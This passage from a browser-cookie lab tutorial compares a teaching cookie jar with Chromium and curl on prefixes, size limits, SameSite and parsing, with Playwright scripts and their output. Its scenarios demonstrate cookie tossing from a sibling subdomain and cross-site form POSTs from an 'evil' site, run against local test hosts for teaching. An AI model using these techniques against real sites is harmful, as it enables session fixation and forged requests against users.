   curl     d=4; b=2; a=1; i=9   <-- same cookies, other order
get http://shop.localhost/q/echo
   chromium h=8; a=1; b=2; d=4; i=9
   jar      h=8; a=1; b=2; d=4; i=9
   curl     h=8; i=9; a=1; b=2; d=4   <-- same cookies, other order
get http://shop.localhost/qq/echo
   chromium a=1; b=2; d=4; i=9
   jar      a=1; b=2; d=4; i=9
   curl     d=4; b=2; a=1; i=9   <-- same cookies, other order
get http://api.shop.localhost/echo
   chromium b=2; d=4; i=9
   jar      b=2; d=4; i=9
   curl     i=9; b=2; d=4   <-- same cookies, other order
get http://blog.shop.localhost/echo
   chromium b=2; d=4; i=9
   jar      b=2; d=4; i=9
   curl     d=4; b=2; i=9   <-- same cookies, other order
get http://shop.localhost/echo
   chromium b=2; d=4; i=9
   jar      b=2; d=4; i=9
   curl     d=4; b=2; i=9   <-- same cookies, other order
get http://api.shop.localhost/echo
   chromium b=2; d=4; i=9
   jar      b=2; d=4; i=9
   curl     i=9; b=2; d=4   <-- same cookies, other order

11 request(s), compared with Chromium:
   teaching jar: 11 identical, 0 same cookies, other order, 0 different cookies
   curl 8.5:     0 identical, 11 same cookies, other order, 0 different cookies
```

`x02_quirks.txt`: parsing and lifetime.

```text
# Cross-check: parsing quirks and lifetime
set http://shop.localhost/set   spaced =  v1 ;  PATH=/ ; HttpOnly
set http://shop.localhost/set   eq=x=y=z
set http://shop.localhost/set   nameless-value
set http://shop.localhost/set   up=1; DOMAIN=shop.localhost; PATH=/
set http://shop.localhost/set   quoted="a b"
set http://shop.localhost/set   semi=a;b
set http://shop.localhost/set   dead1=1; Max-Age=0; Expires=Fri, 01 Jan 2100 00:00:00 GMT
set http://shop.localhost/set   dead2=1; Max-Age=-5
set http://shop.localhost/set   alive1=1; Max-Age=3600; Expires=Thu, 01 Jan 1970 00:00:00 GMT
set http://shop.localhost/set   badage=1; Max-Age=soon
set http://shop.localhost/set   later=1; Expires=Fri, 01 Jan 2100 00:00:00 GMT
set http://shop.localhost/set   past=1; Expires=Thu, 01 Jan 1970 00:00:00 GMT
set http://shop.localhost/set   dup=first
set http://shop.localhost/set   dup=second
set http://shop.localhost/set   dup=third; Path=/
set http://shop.localhost/set   up=; Max-Age=0; Path=/
get http://shop.localhost/echo
```

```text
get http://shop.localhost/echo
   chromium spaced=v1; eq=x=y=z; nameless-value; up=1; quoted="a b"; semi=a; alive1=1; badage=1; later=1; dup=third
   jar      spaced=v1; eq=x=y=z; nameless-value; up=1; quoted="a b"; semi=a; alive1=1; badage=1; later=1; dup=third
   curl     alive1=1; quoted="a b"; spaced=v1; later=1; semi=a; dup=third; eq=x=y=z; up=1   <-- different cookies

1 request(s), compared with Chromium:
   teaching jar: 1 identical, 0 same cookies, other order, 0 different cookies
   curl 8.5:     0 identical, 0 same cookies, other order, 1 different cookies
```

`x03_secure.txt`: `Secure`, prefixes and `SameSite=None` set from a `localhost` name over plain `http://`.

```text
# Cross-check: Secure, prefixes and SameSite=None, set over plain http from a localhost name
secure-localhost on
set http://shop.localhost/set   sec=1; Secure
set http://shop.localhost/set   __Secure-p=1; Secure
set http://shop.localhost/set   __Secure-q=1
set http://shop.localhost/set   __Host-r=1; Secure; Path=/
set http://shop.localhost/set   __Host-s=1; Path=/
set http://shop.localhost/set   __Host-t=1; Secure; Path=/; Domain=shop.localhost
set http://shop.localhost/set   __host-u=1; Secure; Path=/
set http://shop.localhost/set   none-sec=1; SameSite=None; Secure
set http://shop.localhost/set   none-nosec=1; SameSite=None
set http://shop.localhost/set   strict=1; SameSite=Strict
set http://shop.localhost/set   weird=1; SameSite=Banana
set http://shop.localhost/set   __Http-a=1; Secure; HttpOnly
set http://shop.localhost/set   __Http-b=1; Secure
set http://shop.localhost/set   __Host-Http-c=1; Secure; HttpOnly; Path=/
set http://shop.localhost/set   __Host-Http-d=1; Secure; Path=/
get http://shop.localhost/echo
```

```text
get http://shop.localhost/echo
   chromium sec=1; __Secure-p=1; __Host-r=1; __host-u=1; none-sec=1; strict=1; weird=1; __Http-a=1; __Host-Http-c=1
   jar      sec=1; __Secure-p=1; __Host-r=1; __host-u=1; none-sec=1; strict=1; weird=1; __Http-a=1; __Host-Http-c=1
   curl     none-nosec=1; strict=1; weird=1   <-- different cookies

1 request(s), compared with Chromium:
   teaching jar: 1 identical, 0 same cookies, other order, 0 different cookies
   curl 8.5:     0 identical, 0 same cookies, other order, 1 different cookies
```

What to notice:

- **The teaching jar equals Chromium on every request of the three scenarios**: 11 of 11, 1 of 1, 1 of 1, including order.  
  That is the evidence that the model in 10.02 is the browser's.

- **`curl` sends different cookies in a different order.** In `x01` all 11 requests contain the same cookies in another order.  
  In `x02` it drops `nameless-value` and `badage=1`.  
  In `x03` it drops every `Secure` cookie because the URL is `http://` (it does not know `localhost` names are secure), and it keeps `none-nosec=1`, a `SameSite=None` cookie without `Secure` that Chromium refuses.

- **Deleting a `Domain` cookie with a `Set-Cookie` that lacks the `Domain` removes nothing**, in all three engines: the name, domain and path must match.  
  `x02` sets `up=1; DOMAIN=shop.localhost; PATH=/` and later `up=; Max-Age=0; Path=/`, and `up=1` is still sent at the end by the jar, `curl` and Chromium alike.

**Part D: limits.** `drivers/limits.js` sets a cookie of growing size, then 200 cookies in one response:

```js
// Lab 02, part D: how much does a browser keep? One cookie of growing size, then many cookies on one host.
const { url, reset, launch, pad } = require('./lib');

(async () => {
  await reset();
  const browser = await launch();
  const ctx = await browser.newContext();
  const page = await ctx.newPage();

  console.log('== one cookie: name plus value of N bytes ==');
  for (const n of [4000, 4095, 4096, 4097, 5000]) {
    const name = 'big';
    const value = 'x'.repeat(n - name.length);
    await page.goto(url('shop.localhost', '/set?c=' + encodeURIComponent(`${name}=${value}`)));
    const kept = (await ctx.cookies()).filter(c => c.name === name).length;
    console.log(`${pad(n + ' bytes', 12)} ${kept ? 'stored' : 'ignored'}`);
    await ctx.clearCookies();
  }

  console.log('\n== many cookies: 200 Set-Cookie fields from shop.localhost in one response ==');
  const fields = Array.from({ length: 200 }, (_, i) => `c${String(i).padStart(3, '0')}=1`);
  await page.goto(url('shop.localhost', '/set?' + fields.map(f => 'c=' + encodeURIComponent(f)).join('&')));
  const names = (await ctx.cookies()).map(c => c.name).sort();
  console.log(`cookies the browser kept: ${names.length}  (first ${names[0]}, last ${names[names.length - 1]})`);
  await page.goto(url('shop.localhost', '/echo'));
  const header = (await page.innerText('body')).split('\n').find(l => l.startsWith('cookie:'));
  console.log(`the Cookie field sent next: ${header.length - 'cookie: '.length} bytes`);
  await browser.close();
})();
```

```text
== one cookie: name plus value of N bytes ==
4000 bytes   stored
4095 bytes   stored
4096 bytes   stored
4097 bytes   ignored
5000 bytes   ignored

== many cookies: 200 Set-Cookie fields from shop.localhost in one response ==
cookies the browser kept: 169  (first c031, last c199)
the Cookie field sent next: 1350 bytes
```

4096 bytes of name plus value are stored and 4097 are dropped, whole (there is no truncation).  
Of 200 cookies sent in a single response Chromium kept 169, the **newest** (`c031` to `c199`): it evicts the oldest when a host is over its quota, and the exact count depends on the build's eviction batch size.  
The `Cookie` field for the survivors was 1350 bytes.

**Part E: prefixes.** `drivers/prefixes.js` sets 14 cookies, one per rule, and then three more from a script:

```js
// Lab 02, part E: which name prefixes does the browser enforce? Each cookie is set by a Set-Cookie field from
// shop.localhost (a name Chromium treats as secure, so Secure cookies are accepted over plain http), and the table
// shows whether the browser kept it.
const { url, reset, launch, pad } = require('./lib');

const cases = [
  ['__Secure-a=1; Secure',                              'prefix Secure, with Secure'],
  ['__Secure-b=1',                                      'prefix Secure, without Secure'],
  ['__Host-c=1; Secure; Path=/',                        'prefix Host, Secure, Path=/'],
  ['__Host-d=1; Secure; Path=/; Domain=shop.localhost', 'prefix Host with Domain'],
  ['__Host-e=1; Secure; Path=/app',                     'prefix Host with Path=/app'],
  ['__Host-f=1; Path=/',                                'prefix Host without Secure'],
  ['__HOST-g=1; Secure; Path=/',                        'prefix Host in capitals'],
  ['__host-h=1; Path=/',                                'prefix Host in lower case, no Secure'],
  ['__Http-i=1; Secure; HttpOnly',                      'prefix Http, Secure, HttpOnly'],
  ['__Http-j=1; Secure',                                'prefix Http, Secure, not HttpOnly'],
  ['__Http-k=1; HttpOnly',                              'prefix Http, HttpOnly, not Secure'],
  ['__Host-Http-l=1; Secure; HttpOnly; Path=/',         'prefix Host-Http, all rules met'],
  ['__Host-Http-m=1; Secure; Path=/',                   'prefix Host-Http, not HttpOnly'],
  ['__Host-Http-n=1; Secure; HttpOnly; Path=/; Domain=shop.localhost', 'prefix Host-Http with Domain'],
];

(async () => {
  await reset();
  const browser = await launch();
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  console.log(`${pad('Set-Cookie field', 64)} ${pad('kept?', 8)} what it tests`);
  for (const [field, what] of cases) {
    await ctx.clearCookies();
    await page.goto(url('shop.localhost', '/set?c=' + encodeURIComponent(field)));
    const name = field.split('=')[0];
    const kept = (await ctx.cookies()).some(c => c.name === name);
    console.log(`${pad(field, 64)} ${pad(kept ? 'kept' : 'refused', 8)} ${what}`);
  }
  console.log('\nthe same names set by a script, document.cookie = ...');
  await page.goto(url('shop.localhost', '/blank'));
  for (const field of ['__Http-p=1; Secure', '__Host-Http-q=1; Secure; Path=/', '__Host-r=1; Secure; Path=/']) {
    await ctx.clearCookies();
    await page.evaluate(f => { document.cookie = f; }, field);
    const name = field.split('=')[0];
    const kept = (await ctx.cookies()).some(c => c.name === name);
    console.log(`${pad(field, 64)} ${kept ? 'kept' : 'refused'}`);
  }
  await browser.close();
})();
```

```text
Set-Cookie field                                                 kept?    what it tests
__Secure-a=1; Secure                                             kept     prefix Secure, with Secure
__Secure-b=1                                                     refused  prefix Secure, without Secure
__Host-c=1; Secure; Path=/                                       kept     prefix Host, Secure, Path=/
__Host-d=1; Secure; Path=/; Domain=shop.localhost                refused  prefix Host with Domain
__Host-e=1; Secure; Path=/app                                    refused  prefix Host with Path=/app
__Host-f=1; Path=/                                               refused  prefix Host without Secure
__HOST-g=1; Secure; Path=/                                       kept     prefix Host in capitals
__host-h=1; Path=/                                               refused  prefix Host in lower case, no Secure
__Http-i=1; Secure; HttpOnly                                     kept     prefix Http, Secure, HttpOnly
__Http-j=1; Secure                                               refused  prefix Http, Secure, not HttpOnly
__Http-k=1; HttpOnly                                             refused  prefix Http, HttpOnly, not Secure
__Host-Http-l=1; Secure; HttpOnly; Path=/                        kept     prefix Host-Http, all rules met
__Host-Http-m=1; Secure; Path=/                                  refused  prefix Host-Http, not HttpOnly
__Host-Http-n=1; Secure; HttpOnly; Path=/; Domain=shop.localhost refused  prefix Host-Http with Domain

the same names set by a script, document.cookie = ...
__Http-p=1; Secure                                               refused
__Host-Http-q=1; Secure; Path=/                                  refused
__Host-r=1; Secure; Path=/                                       kept
```

`s04_prefixes.txt` asks the jar the same questions and adds two stories: an insecure page overwriting a `Secure` cookie, and cookie tossing from a sibling subdomain (10.04):

```text
# Prefixes, "leave Secure cookies alone", and cookie tossing from a sibling subdomain
# 1. the prefix rules
set https://shop.example.com/   __Secure-a=1; Secure
set https://shop.example.com/   __Secure-b=1
set https://shop.example.com/   __Host-c=1; Secure; Path=/
set https://shop.example.com/   __Host-d=1; Secure; Path=/; Domain=example.com
set https://shop.example.com/   __Host-e=1; Secure; Path=/app
set https://shop.example.com/   __Host-f=1; Path=/
set http://shop.example.com/    __Host-g=1; Secure; Path=/
set https://shop.example.com/   __HOST-h=1; Secure; Path=/
# 2. an insecure page cannot overwrite a Secure cookie
set https://shop.example.com/   sid=SECURE-REAL; Secure; Path=/
set http://shop.example.com/    sid=PLANTED; Path=/
get https://shop.example.com/
# 3. cookie tossing: blog.example.com plants a cookie for the whole site, with a longer path so it is sent first
set https://blog.example.com/   tid=ATTACKER; Domain=example.com; Path=/
set https://shop.example.com/   tid=LEGIT; Path=/
set https://blog.example.com/   tid=ATTACKER-2; Domain=example.com; Path=/account
get https://shop.example.com/
get https://shop.example.com/account
# 4. the same attack against a __Host- cookie
set https://shop.example.com/   __Host-sid=LEGIT; Secure; Path=/
set https://blog.example.com/   __Host-sid=ATTACKER; Secure; Path=/; Domain=example.com
set https://blog.example.com/   __Host-sid=ATTACKER; Secure; Path=/
get https://shop.example.com/account
get https://blog.example.com/account
# 5. HttpOnly cookies are invisible to scripts
set https://shop.example.com/   hid=1; Secure; HttpOnly; Path=/
get https://shop.example.com/ --script
# 6. the two newer prefixes: __Http- needs Secure and HttpOnly, __Host-Http- needs the __Host- rules and HttpOnly
set https://shop.example.com/   __Http-a=1; Secure; HttpOnly
set https://shop.example.com/   __Http-b=1; Secure
set https://shop.example.com/   __Http-c=1; HttpOnly
set https://shop.example.com/   __Host-Http-d=1; Secure; HttpOnly; Path=/
set https://shop.example.com/   __Host-Http-e=1; Secure; Path=/
set https://shop.example.com/   __Host-Http-f=1; Secure; HttpOnly; Path=/; Domain=example.com
set https://shop.example.com/ --script   __Http-g=1; Secure
```

```text
# Prefixes, "leave Secure cookies alone", and cookie tossing from a sibling subdomain
# 1. the prefix rules
set https://shop.example.com/   __Secure-a=1; Secure
  -> stored __Secure-a=1 (host-only shop.example.com, path /, Secure, SameSite=default, session)
set https://shop.example.com/   __Secure-b=1
  -> ignored: __Secure- prefix needs Secure
set https://shop.example.com/   __Host-c=1; Secure; Path=/
  -> stored __Host-c=1 (host-only shop.example.com, path /, Secure, SameSite=default, session)
set https://shop.example.com/   __Host-d=1; Secure; Path=/; Domain=example.com
  -> ignored: __Host- prefix forbids Domain
set https://shop.example.com/   __Host-e=1; Secure; Path=/app
  -> ignored: __Host- prefix needs Path=/
set https://shop.example.com/   __Host-f=1; Path=/
  -> ignored: __Host- prefix needs Secure
set http://shop.example.com/    __Host-g=1; Secure; Path=/
  -> ignored: Secure cookie from an insecure URL
set https://shop.example.com/   __HOST-h=1; Secure; Path=/
  -> stored __HOST-h=1 (host-only shop.example.com, path /, Secure, SameSite=default, session)
# 2. an insecure page cannot overwrite a Secure cookie
set https://shop.example.com/   sid=SECURE-REAL; Secure; Path=/
  -> stored sid=SECURE-REAL (host-only shop.example.com, path /, Secure, SameSite=default, session)
set http://shop.example.com/    sid=PLANTED; Path=/
  -> ignored: would overwrite a Secure cookie from an insecure URL
get https://shop.example.com/
  -> Cookie: __Secure-a=1; __Host-c=1; __HOST-h=1; sid=SECURE-REAL
# 3. cookie tossing: blog.example.com plants a cookie for the whole site, with a longer path so it is sent first
set https://blog.example.com/   tid=ATTACKER; Domain=example.com; Path=/
  -> stored tid=ATTACKER (domain example.com, path /, SameSite=default, session)
set https://shop.example.com/   tid=LEGIT; Path=/
  -> stored tid=LEGIT (host-only shop.example.com, path /, SameSite=default, session)
set https://blog.example.com/   tid=ATTACKER-2; Domain=example.com; Path=/account
  -> stored tid=ATTACKER-2 (domain example.com, path /account, SameSite=default, session)
get https://shop.example.com/
  -> Cookie: __Secure-a=1; __Host-c=1; __HOST-h=1; sid=SECURE-REAL; tid=ATTACKER; tid=LEGIT
     skipped tid: path /account does not match /
get https://shop.example.com/account
  -> Cookie: tid=ATTACKER-2; __Secure-a=1; __Host-c=1; __HOST-h=1; sid=SECURE-REAL; tid=ATTACKER; tid=LEGIT
# 4. the same attack against a __Host- cookie
set https://shop.example.com/   __Host-sid=LEGIT; Secure; Path=/
  -> stored __Host-sid=LEGIT (host-only shop.example.com, path /, Secure, SameSite=default, session)
set https://blog.example.com/   __Host-sid=ATTACKER; Secure; Path=/; Domain=example.com
  -> ignored: __Host- prefix forbids Domain
set https://blog.example.com/   __Host-sid=ATTACKER; Secure; Path=/
  -> stored __Host-sid=ATTACKER (host-only blog.example.com, path /, Secure, SameSite=default, session)
get https://shop.example.com/account
  -> Cookie: tid=ATTACKER-2; __Secure-a=1; __Host-c=1; __HOST-h=1; sid=SECURE-REAL; tid=ATTACKER; tid=LEGIT; __Host-sid=LEGIT
     skipped __Host-sid: domain blog.example.com does not match shop.example.com
get https://blog.example.com/account
  -> Cookie: tid=ATTACKER-2; tid=ATTACKER; __Host-sid=ATTACKER
     skipped __Secure-a: domain shop.example.com does not match blog.example.com
     skipped __Host-c: domain shop.example.com does not match blog.example.com
     skipped __HOST-h: domain shop.example.com does not match blog.example.com
     skipped sid: domain shop.example.com does not match blog.example.com
     skipped tid: domain shop.example.com does not match blog.example.com
     skipped __Host-sid: domain shop.example.com does not match blog.example.com
# 5. HttpOnly cookies are invisible to scripts
set https://shop.example.com/   hid=1; Secure; HttpOnly; Path=/
  -> stored hid=1 (host-only shop.example.com, path /, Secure, HttpOnly, SameSite=default, session)
get https://shop.example.com/ --script
  -> Cookie: __Secure-a=1; __Host-c=1; __HOST-h=1; sid=SECURE-REAL; tid=ATTACKER; tid=LEGIT; __Host-sid=LEGIT
     skipped tid: path /account does not match /
     skipped __Host-sid: domain blog.example.com does not match shop.example.com
     skipped hid: HttpOnly cookie, script API
# 6. the two newer prefixes: __Http- needs Secure and HttpOnly, __Host-Http- needs the __Host- rules and HttpOnly
set https://shop.example.com/   __Http-a=1; Secure; HttpOnly
  -> stored __Http-a=1 (host-only shop.example.com, path /, Secure, HttpOnly, SameSite=default, session)
set https://shop.example.com/   __Http-b=1; Secure
  -> ignored: __Http- prefix needs HttpOnly
set https://shop.example.com/   __Http-c=1; HttpOnly
  -> ignored: __Http- prefix needs Secure
set https://shop.example.com/   __Host-Http-d=1; Secure; HttpOnly; Path=/
  -> stored __Host-Http-d=1 (host-only shop.example.com, path /, Secure, HttpOnly, SameSite=default, session)
set https://shop.example.com/   __Host-Http-e=1; Secure; Path=/
  -> ignored: __Host-Http- prefix needs HttpOnly
set https://shop.example.com/   __Host-Http-f=1; Secure; HttpOnly; Path=/; Domain=example.com
  -> ignored: __Host- prefix forbids Domain
set https://shop.example.com/ --script   __Http-g=1; Secure
  -> ignored: __Http- prefix needs HttpOnly
```

What to notice:

- **The browser enforced all four prefixes**, including `__Http-` and `__Host-Http-` that the draft does not have.  
  The jar prints the reason for each refusal (`__Host- prefix forbids Domain`, `__Http- prefix needs HttpOnly`).

- **Case does not help.** `__HOST-g` with `Secure; Path=/` was kept and `__host-h` without `Secure` was refused: the browser matches the prefix without regard to case.

- **A script cannot set `__Http-` or `__Host-Http-`**, because those require `HttpOnly`, which a script cannot set. It *can* set a plain `__Host-` cookie from an HTTPS page.

- **Item 2 of the jar story:** `http://shop.example.com/` tries to set `sid=PLANTED` and is ignored, because a `Secure` cookie named `sid` already exists.  
  This is "leave Secure cookies alone", and it stops a network attacker who can only touch plaintext HTTP from replacing the cookie.

- **Items 3 and 4:** the planted `tid` cookies come first in the `Cookie` field (older, or longer path), and the planted `__Host-sid=ATTACKER` from `blog.example.com` is stored host-only *for the blog* and is never sent to the shop.

Things to try:

01. Write a scenario that sets `p=1; Path=/app` and requests `/app`, `/app/`, `/app/x` and `/apple`.  
  The first three carry `p=1` and `/apple` does not: the path must end at a `/` boundary.

02. `curl -s --noproxy '' -H 'Cookie: a=1; a=2' http://shop.localhost:9400/echo` prints `cookie: a=1; a=2`: the server receives the duplicates in the order sent.

03. Delete the first line of `x03_secure.txt`, `secure-localhost on`, and run the cross-check again.  
  The jar now behaves like a browser that does not know `localhost` is secure: it keeps only `strict=1; weird=1`, while Chromium still keeps nine cookies.  
  The switch exists to model that one browser rule.

### Lab 03: the `SameSite` matrix

Goal: measure, for four cookies and eight contexts, which cookies Chromium sends, and compare with the jar's prediction.

**Part A: the browser.**  
The driver sets `c-strict`, `c-lax`, `c-none` and `c-default` from a first-party visit, then triggers eight requests to the shop (an `<img>`, a `fetch`, an `<iframe>`, a link, a form `POST`) from pages on the shop's origin,  
a sibling and `evil.localhost`, and reads which cookie names the shop logged.  
It waits 130 seconds before the last context so that the cookies age past the two-minute `POST` window:

```js
// Lab 03: which cookies does Chromium send in eight request contexts? Four cookies are set by the shop first:
// SameSite=Strict, SameSite=Lax, SameSite=None, and no SameSite at all. The shop's log says which arrived.
// The same eight contexts are then put to the teaching cookie jar, and the two answers are compared.
const { execFileSync } = require('child_process');
const noJavaOptions = () => { const e = { ...process.env }; delete e.JAVA_TOOL_OPTIONS; return e; };
const fs = require('fs');
const path = require('path');
const { url, sleep, reset, clearLog, readLog, launch, settle, pad } = require('./lib');

const COOKIES = ['c-strict=1; SameSite=Strict', 'c-lax=1; SameSite=Lax', 'c-none=1; SameSite=None; Secure', 'c-default=1'];
const NAMES = ['c-strict', 'c-lax', 'c-none', 'c-default'];
const shopEcho = url('shop.localhost', '/echo');

// Each context: where the page is, and what it does to make a request to the shop's /echo.
const contexts = [
  { label: '01 same origin: fetch from a shop page', page: 'shop.localhost', jar: '',
    run: p => p.evaluate(t => fetch(t).catch(() => {}), shopEcho) },
  { label: '02 same site, other origin: fetch from app.shop.localhost', page: 'app.shop.localhost', jar: '--site=http://app.shop.localhost/',
    run: p => p.evaluate(t => fetch(t, { credentials: 'include' }).catch(() => {}), shopEcho) },
  { label: '03 cross-site: <img> on evil.localhost', page: 'evil.localhost', jar: '--site=http://evil.localhost/',
    run: p => p.evaluate(t => { const i = new Image(); i.src = t; }, shopEcho) },
  { label: '04 cross-site: fetch with credentials', page: 'evil.localhost', jar: '--site=http://evil.localhost/',
    run: p => p.evaluate(t => fetch(t, { credentials: 'include' }).catch(() => {}), shopEcho) },
  { label: '05 cross-site: <iframe>', page: 'evil.localhost', jar: '--site=http://evil.localhost/',
    run: p => p.evaluate(t => new Promise(res => { const f = document.createElement('iframe'); f.onload = res; f.src = t; document.body.appendChild(f); }), shopEcho) },
  { label: '06 cross-site: top-level navigation, GET', page: 'evil.localhost', jar: '--site=http://evil.localhost/ --nav',
    run: p => Promise.all([p.waitForNavigation(), p.evaluate(t => { location.href = t; }, shopEcho)]) },
  { label: '07 cross-site: top-level navigation, POST, 1 s old cookies', page: 'evil.localhost', jar: '--site=http://evil.localhost/ --nav --method=POST',
    run: p => Promise.all([p.waitForNavigation(), p.evaluate(t => { const f = document.createElement('form'); f.method = 'post'; f.action = t; document.body.appendChild(f); f.submit(); }, shopEcho)]) },
  { label: '08 cross-site: top-level navigation, POST, 130 s old cookies', page: 'evil.localhost', jar: '--site=http://evil.localhost/ --nav --method=POST', after: 130,
    run: p => Promise.all([p.waitForNavigation(), p.evaluate(t => { const f = document.createElement('form'); f.method = 'post'; f.action = t; document.body.appendChild(f); f.submit(); }, shopEcho)]) },
];

(async () => {
  await reset();
  const browser = await launch();
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  await page.goto(url('shop.localhost', '/set?' + COOKIES.map(c => 'c=' + encodeURIComponent(c)).join('&')));
  const setAt = Date.now();
  const stored = (await ctx.cookies()).map(c => c.name).join(', ');
  console.log(`cookies stored by the browser: ${stored}\n`);

  const measured = [];
  for (const c of contexts) {
    if (c.after) { const wait = setAt + c.after * 1000 - Date.now(); if (wait > 0) { console.error(`(waiting ${Math.ceil(wait / 1000)} s for the cookies to age past two minutes)`); await sleep(wait); } }
    await page.goto(url(c.page, '/blank'));
    await clearLog();
    await c.run(page);
    await settle(page, 400);
    const rec = (await readLog()).filter(r => r.host === 'shop.localhost' && r.path === '/echo').pop();
    measured.push(rec ? rec.cookies : null);
  }

  // The same contexts, put to the teaching jar (Java)
  const lines = ['secure-localhost on', ...COOKIES.map(c => `set http://shop.localhost/set ${c}`)];
  for (const c of contexts) {
    if (c.after) lines.push(`advance ${c.after}`);
    lines.push(`get http://shop.localhost/echo ${c.jar}`);
  }
  const scenario = path.join(__dirname, '..', 'out', 'samesite_jar_scenario.txt');
  fs.writeFileSync(scenario, lines.join('\n') + '\n');
  const jarOut = execFileSync('java', [path.join(__dirname, '..', 'java', 'CookieJar.java'), scenario], { env: noJavaOptions(), encoding: 'utf8' });
  const predicted = [];
  for (const l of jarOut.split('\n')) {
    if (l.startsWith('  -> Cookie: ')) predicted.push(l.slice(13).split('; ').map(x => x.split('=')[0]));
    else if (l.startsWith('  -> (no Cookie field)')) predicted.push([]);
  }

  console.log(pad('context', 66) + NAMES.map(n => pad(n, 11)).join(''));
  let agree = 0, cells = 0;
  contexts.forEach((c, i) => {
    const got = measured[i] || [];
    let row = pad(c.label, 66);
    for (const n of NAMES) {
      const sent = got.includes(n);
      row += pad(sent ? 'sent' : '-', 11);
      cells++;
      if (sent === predicted[i].includes(n)) agree++;
    }
    console.log(row);
  });
  console.log(`\nteaching jar against Chromium: ${agree} of ${cells} cells agree`);
  await browser.close();
})();
```

Run: `node drivers/samesite.js` (about two and a half minutes).

```text
cookies stored by the browser: c-strict, c-lax, c-none, c-default

context                                                           c-strict   c-lax      c-none     c-default  
01 same origin: fetch from a shop page                            sent       sent       sent       sent       
02 same site, other origin: fetch from app.shop.localhost         sent       sent       sent       sent       
03 cross-site: <img> on evil.localhost                            -          -          sent       -          
04 cross-site: fetch with credentials                             -          -          sent       -          
05 cross-site: <iframe>                                           -          -          sent       -          
06 cross-site: top-level navigation, GET                          -          sent       sent       sent       
07 cross-site: top-level navigation, POST, 1 s old cookies        -          -          sent       sent       
08 cross-site: top-level navigation, POST, 130 s old cookies      -          -          sent       -          

teaching jar against Chromium: 32 of 32 cells agree
```

**Part B: the jar.** `s03_samesite.txt` asks the same questions with `--site` (the top-level page's site), `--nav` (a top-level navigation) and `--method`,  
plus a scheme change and a cross-site subresource that tries to *set* cookies:

```text
# SameSite: one cookie of each kind, set by a first-party response, then sent (or not) in six contexts
set https://shop.example.com/   c-strict=1; SameSite=Strict
set https://shop.example.com/   c-lax=1; SameSite=Lax
set https://shop.example.com/   c-none=1; SameSite=None; Secure
set https://shop.example.com/   c-default=1
# 1. first-party: the page is on the shop's own site
get https://shop.example.com/account
# 2. same site, another origin: a page on app.example.com calls the shop; both belong to the site example.com
get https://shop.example.com/data --site=https://app.example.com/
# 3. a cross-site image or fetch from a page on evil.net
get https://shop.example.com/pixel --site=https://evil.net/
# 4. a cross-site top-level navigation by GET: the user clicks a link on evil.net
get https://shop.example.com/account --site=https://evil.net/ --nav
# 5. a cross-site top-level POST: a form on evil.net submits to the shop, one second after the cookies were set
get https://shop.example.com/transfer --site=https://evil.net/ --nav --method=POST
# 6. the same POST two minutes and ten seconds later: the Lax+POST window has closed
advance 130
get https://shop.example.com/transfer --site=https://evil.net/ --nav --method=POST
# 7. a scheme change: the page is http, the request is https (schemeful same-site)
get https://shop.example.com/account --site=http://shop.example.com/
# 8. no site at all (a request with no top-level context)
get https://shop.example.com/account --site=none
# 9. setting a cookie from a cross-site subresource response
set https://shop.example.com/pixel --site=https://evil.net/ x-lax=1; SameSite=Lax
set https://shop.example.com/pixel --site=https://evil.net/ x-default=1
set https://shop.example.com/pixel --site=https://evil.net/ x-none=1; SameSite=None; Secure
set https://shop.example.com/pixel --site=https://evil.net/ x-bad=1; SameSite=None
get https://shop.example.com/account
```

```text
# SameSite: one cookie of each kind, set by a first-party response, then sent (or not) in six contexts
set https://shop.example.com/   c-strict=1; SameSite=Strict
  -> stored c-strict=1 (host-only shop.example.com, path /, SameSite=Strict, session)
set https://shop.example.com/   c-lax=1; SameSite=Lax
  -> stored c-lax=1 (host-only shop.example.com, path /, SameSite=Lax, session)
set https://shop.example.com/   c-none=1; SameSite=None; Secure
  -> stored c-none=1 (host-only shop.example.com, path /, Secure, SameSite=None, session)
set https://shop.example.com/   c-default=1
  -> stored c-default=1 (host-only shop.example.com, path /, SameSite=default, session)
# 1. first-party: the page is on the shop's own site
get https://shop.example.com/account
  -> Cookie: c-strict=1; c-lax=1; c-none=1; c-default=1
# 2. same site, another origin: a page on app.example.com calls the shop; both belong to the site example.com
get https://shop.example.com/data --site=https://app.example.com/
  -> Cookie: c-strict=1; c-lax=1; c-none=1; c-default=1
# 3. a cross-site image or fetch from a page on evil.net
get https://shop.example.com/pixel --site=https://evil.net/
  -> Cookie: c-none=1
     skipped c-strict: SameSite=Strict, cross-site request
     skipped c-lax: SameSite=Lax, cross-site subresource request
     skipped c-default: default (Lax), cross-site subresource request
# 4. a cross-site top-level navigation by GET: the user clicks a link on evil.net
get https://shop.example.com/account --site=https://evil.net/ --nav
  -> Cookie: c-lax=1; c-none=1; c-default=1
     skipped c-strict: SameSite=Strict, cross-site request
# 5. a cross-site top-level POST: a form on evil.net submits to the shop, one second after the cookies were set
get https://shop.example.com/transfer --site=https://evil.net/ --nav --method=POST
  -> Cookie: c-none=1; c-default=1
     skipped c-strict: SameSite=Strict, cross-site request
     skipped c-lax: SameSite=Lax, cross-site POST navigation
# 6. the same POST two minutes and ten seconds later: the Lax+POST window has closed
advance 130
get https://shop.example.com/transfer --site=https://evil.net/ --nav --method=POST
  -> Cookie: c-none=1
     skipped c-strict: SameSite=Strict, cross-site request
     skipped c-lax: SameSite=Lax, cross-site POST navigation
     skipped c-default: default (Lax), cross-site POST navigation older than 120 s
# 7. a scheme change: the page is http, the request is https (schemeful same-site)
get https://shop.example.com/account --site=http://shop.example.com/
  -> Cookie: c-none=1
     skipped c-strict: SameSite=Strict, cross-site request
     skipped c-lax: SameSite=Lax, cross-site subresource request
     skipped c-default: default (Lax), cross-site subresource request
# 8. no site at all (a request with no top-level context)
get https://shop.example.com/account --site=none
  -> Cookie: c-none=1
     skipped c-strict: SameSite=Strict, cross-site request
     skipped c-lax: SameSite=Lax, cross-site subresource request
     skipped c-default: default (Lax), cross-site subresource request
# 9. setting a cookie from a cross-site subresource response
set https://shop.example.com/pixel --site=https://evil.net/ x-lax=1; SameSite=Lax
  -> ignored: SameSite=Lax cookie set from a cross-site context
set https://shop.example.com/pixel --site=https://evil.net/ x-default=1
  -> ignored: default (Lax) cookie set from a cross-site context
set https://shop.example.com/pixel --site=https://evil.net/ x-none=1; SameSite=None; Secure
  -> stored x-none=1 (host-only shop.example.com, path /, Secure, SameSite=None, session)
